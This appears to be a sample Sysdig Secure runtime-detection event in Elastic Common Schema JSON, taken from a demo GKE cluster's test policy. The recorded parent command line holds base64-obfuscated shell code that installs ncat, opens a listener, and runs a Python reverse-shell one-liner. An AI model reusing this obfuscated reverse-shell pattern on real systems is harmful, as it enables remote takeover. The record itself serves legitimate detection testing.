{
    "@timestamp": "2025-04-05T03:00:01.1159286Z",
    "agent": {
        "ephemeral_id": "9c2740ce-0231-4f1c-9b03-ba17c5430743",
        "id": "57e0981b-86e9-4bda-a293-dde14ffd115d",
        "name": "elastic-agent-91842",
        "type": "filebeat",
        "version": "8.14.1"
    },
    "cloud": {
        "account": {
            "id": "012345678912"
        },
        "project": {
            "id": "012345678912"
        },
        "provider": "gcp",
        "region": "us-central1"
    },
    "container": {
        "image": {
            "hash": {
                "all": [
                    "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                ]
            },
            "name": "docker.io/library/python"
        },
        "name": "shell-scripting"
    },
    "data_stream": {
        "dataset": "sysdig.event",
        "namespace": "31832",
        "type": "logs"
    },
    "ecs": {
        "version": "8.11.0"
    },
    "elastic_agent": {
        "id": "57e0981b-86e9-4bda-a293-dde14ffd115d",
        "snapshot": false,
        "version": "8.14.1"
    },
    "event": {
        "agent_id_status": "verified",
        "category": [
            "process"
        ],
        "dataset": "sysdig.event",
        "id": "1a334cdef0060123456789abcdef64a9",
        "ingested": "2025-05-19T08:53:26Z",
        "kind": "event",
        "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.image.repository\":\"docker.io/library/python\",\"container.name\":\"shell-scripting\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.args\":\"\",\"proc.cmdline\":\"sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/dash\",\"proc.hash.sha256\":\"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6\",\"proc.name\":\"sh\",\"proc.pcmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.pid\":\"1372469\",\"proc.pid.ts\":\"1743822001115100312\",\"proc.pname\":\"bash\",\"proc.ppid\":\"1372453\",\"proc.ppid.ts\":\"1743822000952432134\",\"proc.sid\":\"1\",\"user.loginname\":\"\\u003cNA\\u003e\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Secure UI\",\"output\":\"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=\\u003cNA\\u003e group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)\",\"policyId\":10569534,\"ruleName\":\"My test rule custom\",\"ruleSubType\":0,\"ruleTags\":[\"My-tag-custom-1-hello-world\",\"MITTRE-WHATEVER\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This is just a dumb policy to test custom policies\",\"engine\":\"falco\",\"id\":\"1a334cdef0060123456789abcdef64a9\",\"labels\":{\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a\",\"container.image.id\":\"ef0f72a55bd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-29063700-123ab\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"012345678912\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29063700\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-12345678-abcd\",\"kubernetes.pod.name\":\"shell-scripting-12345678-123ab\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Manuel test policy\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":4,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1743822001115928600}",
        "outcome": "success",
        "provider": "syscall",
        "severity": 4,
        "type": [
            "info"
        ]
    },
    "host": {
        "hostname": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
        "mac": [
            "01-00-5E-90-10-00"
        ],
        "name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
    },
    "input": {
        "type": "cel"
    },
    "message": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
    "observer": {
        "product": "Sysdig Secure",
        "vendor": "Sysdig"
    },
    "orchestrator": {
        "cluster": {
            "name": "gke-alliances-demo-6"
        },
        "namespace": "default",
        "resource": {
            "name": "shell-scripting-12345678-123ab",
            "parent": {
                "type": "cronjob"
            }
        }
    },
    "process": {
        "command_line": "sh",
        "executable": "/usr/bin/dash",
        "hash": {
            "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
        },
        "name": "sh",
        "parent": {
            "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
            "name": "bash",
            "pid": 1372453,
            "start": "2025-04-05T03:00:00.952432134Z"
        },
        "pid": 1372469,
        "start": "2025-04-05T03:00:01.115100312Z",
        "working_directory": "/"
    },
    "related": {
        "hash": [
            "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
            "aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
        ],
        "hosts": [
            "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
        ],
        "user": [
            "root",
            "0"
        ]
    },
    "rule": {
        "description": "This is just a dumb policy to test custom policies",
        "name": "My test rule custom",
        "ruleset": "Manuel test policy"
    },
    "sysdig": {
        "event": {
            "category": "runtime",
            "content": {
                "fields": {
                    "evt": {
                        "res": "SUCCESS",
                        "type": "execve"
                    },
                    "proc": {
                        "sid": "1"
                    }
                },
                "origin": "Secure UI",
                "policy_id": "10569534",
                "rule_sub_type": 0,
                "rule_tags": [
                    "My-tag-custom-1-hello-world",
                    "MITTRE-WHATEVER"
                ],
                "rule_type": 6,
                "type": "workloadRuntimeDetection"
            },
            "engine": "falco",
            "labels": {
                "container": {
                    "image": {
                        "id": "ef0f72a55bd2",
                        "repo": "docker.io/library/python",
                        "tag": "3.9.18-slim"
                    },
                    "label": {
                        "io": {
                            "kubernetes": {
                                "container": {
                                    "name": "shell-scripting"
                                },
                                "pod": {
                                    "name": "shell-scripting-29063700-123ab",
                                    "namespace": "default"
                                }
                            }
                        }
                    },
                    "name": "shell-scripting"
                },
                "gcp": {
                    "location": "us-central1",
                    "project_id": "012345678912"
                },
                "kubernetes": {
                    "cron_job": {
                        "name": "shell-scripting"
                    },
                    "job": {
                        "name": "shell-scripting-29063700"
                    },
                    "node": {
                        "name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd"
                    },
                    "workload": {
                        "name": "shell-scripting"
                    }
                }
            },
            "originator": "policy",
            "raw_event_category": "runtime",
            "raw_event_originator": "linuxAgent",
            "severity_value": "Medium",
            "source_details": {
                "sub_type": "container",
                "type": "workload"
            }
        }
    },
    "tags": [
        "preserve_original_event",
        "forwarded",
        "sysdig-event"
    ],
    "user": {
        "group": {
            "id": "0",
            "name": "root"
        },
        "id": "0",
        "name": "root"
    }
}
